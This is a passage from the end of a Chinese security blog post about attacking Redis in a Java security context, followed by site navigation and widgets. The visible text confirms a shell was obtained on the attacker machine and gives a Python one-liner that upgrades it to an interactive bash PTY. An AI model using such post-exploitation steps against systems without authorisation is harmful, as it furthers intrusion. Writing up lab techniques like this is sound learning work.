<p>然后去攻击机那边进行查看</p>
<p><img src="https://image.3001.net/images/20210718/1626565906_60f36d12da5165373e0d1.png!small" alt="在这里插入图片描述"></p>
<p>可以看到已经拿到了</p>
<p>python进入pty</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure></div>
        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
                <div class="post-like-donate text-center clearfix" id="post-like-donate">
                
                
                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
                    <div class="share-wrap" style="display: none;">
    <div class="share-group">
        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-qq"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-star"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weixin"></i>
            </div>
            <div class="share-int">
                <div class="qrcode" id="wechat-qr"></div>
                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weibo"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-facebook"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-twitter"></i>
            </div>
        </a>
    </div>
    <script type="text/javascript">
        $(()=>{
            new QRCode("wechat-qr", {
                text: "https://qwq0qwq.github.io/2024/02/10/java%E5%AE%89%E5%85%A8-redis/",
                width: 150,
                height: 150,
                correctLevel : QRCode.CorrectLevel.H
            });
        });
        function share(dest) {
            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
            const weiboBase     = "https://service.weibo.com/share/share.php?";
            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
            const twitterBase   = "https://twitter.com/intent/tweet?";
            const hostUrl       = "https://qwq0qwq.github.io/2024/02/10/java%E5%AE%89%E5%85%A8-redis/";
            const title         = "「java安全-redis」";
            const excerpt       = `java安全-redis1.什么是redisREmote DIctionary Server（Redis）是一个由 Salvatore Sanfilippo写的key-value存储系统。Redis是—个开源的使用ANSI C语言编写...`;
            let _URL;
            switch (dest) {
                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
            }
            window.open(_URL);
        };
    </script>
</div>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    <a class="tag-none-link" href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag">java安全</a>
                </div>
                <div class="pull-date">
                    <time datetime="2024-02-10T14:27:17.292Z" itemprop="dateModified">最后编辑：2024-02-10</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" Linux内核" href="/2023/10/11/Linux内核/">&lt; 上一篇</a>
            </div>
            
            
            <div class="nav-next clearfix">
                <a title=" java安全-log4j_log4j2" href="/2024/02/10/java安全-log4j-log4j2/">下一篇 &gt;</a>
            </div>
            
        </nav>
    
    
</article>

        

            </section>

        

                
            

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/icon.jpg" loading="lazy" decoding="auto" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center"></p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                文章
            </span>
            <span class="count">
                20
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                分类
            </span>
            <span class="count">
                0
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                标签
            </span>
            <span class="count">
                3
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                

            
                
  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
      <div class="tag-clouds">
        <a href="/tags/HTB/" style="font-size: 0.6em;">HTB</a> <a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 0.8em;">java安全</a> <a href="/tags/java%E5%AE%89%E5%85%A8s/" style="font-size: 0.6em;">java安全s</a>
      </div>
  </aside>

            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/2025/01/19/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa  fa-book"></i> 免杀学习笔记</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/01/19/EscapeTwo/"><i class="fa  fa-book"></i> EscapeTwo</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/01/07/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/"><i class="fa  fa-book"></i> plt表和got表</a>
            
          
        
          
          
            <a class="list-group-item" href="/2024/11/24/%E6%9C%A8%E9%A9%AC%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fa  fa-book"></i> 木马隐藏技巧（一）</a>
            
          
        
          
          
            <a class="list-group-item" href="/2024/11/23/%E5%AE%89%E5%8D%93%E6%8A%93%E5%8C%85/"><i class="fa  fa-book"></i> 安卓抓包</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>
        
        </div>
    </div>
</div>
<footer>
    <div id="footer"  class="ap-lrc"  >
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        <!-- Keep for compatibility -->
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        <!-- New links -->
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2025 QWQ0QWQ's blog 版权所有.</li>
                            <li>本站已运行<span id="span_dt">Loading...</span></li>
                        </div>
                        <div>
                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by QWQ0QWQ.</li>
                        </div>
                        <div>
                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
                            <li>Hosted on <a href="https://QwQ0QwQ.github.io" target="_blank">Github Pages</a></li>
                        </div>
                        <div>
                            
                            
                        </div>
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search/">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                
                    <div class="box theme-box" id="darkmode-switch">
                        <span class="fa fa-adjust"></span>
                    </div>
                
                
                
            </div>
            <div class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>

        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
<script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>


    <script async src="/js/candy.min.js"></script>



    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
    
    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
    <meting-js
        server="netease"
        type="playlist"
        id="3204190542"
        order="random"
        fixed="true"
    >
    </meting-js>



    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script defer src="/js/kratosr.min.js"></script>
<script defer src="/js/pjax.min.js"></script>



<!-- Extra support for third-party plguins  -->


    </body>
</html>